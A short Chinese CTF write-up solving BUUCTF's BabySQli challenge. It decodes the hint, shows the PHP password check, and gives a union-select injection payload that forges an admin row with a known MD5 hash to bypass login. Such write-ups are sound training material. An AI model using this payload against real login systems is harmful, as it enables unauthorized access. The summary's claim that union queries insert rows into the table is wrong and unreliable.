# T10 还是SQL注入

> 题目：BUUCTF [GXYCTF2019]BabySQli

__0x00 审题__

> 啥也不会（

开始能试的都试了，有过滤，回显一直是那两个，直接post传参还没反应，不知道怎么弄了，原代码有一行绿字开始看都没看直接走了，看了别人的才知道有一定的提示作用

> 只能说接下来借鉴程度很高

__0x01 解题__

1. 看源代码

```
<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->
```

这是一行需要经过base32和base64两次加密才能得到的secret（

```
select * from user where username = '$name'
```

在name处存在注点

2. BUUCTF提供源码，看看重点：

```php
    if($arr[1] == "admin"){
        if(md5($password) == $arr[2]){
            echo $flag;
        }
        else{
            die("wrong pass!");
        }
    }
    else{
        die("wrong user!");
```

* 这个我看的懂，当名字为admin时，先将我们提交的密码进行MD5加密，然后与数据库中的进行比较

3. 传参

```
' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#
pw=123456
```

得到FLAG

__0X02 总结__

1. 形如大写字母与数字相间的，可以用base32解密
2. 联合查询的数据库特性：联合查询不存在的数据时，数据库会将这段数据插入到表中，构造虚拟数据。
3. union select会把查询结果接在前一个查询结果后面，前面如果查到了东西，那么取得还是第一行，除非有limit 这种取第几行
4. 问题1：为何时post传参我却不能用hackbar传参？
5. 问题2：如何区分何时该用什么注入？
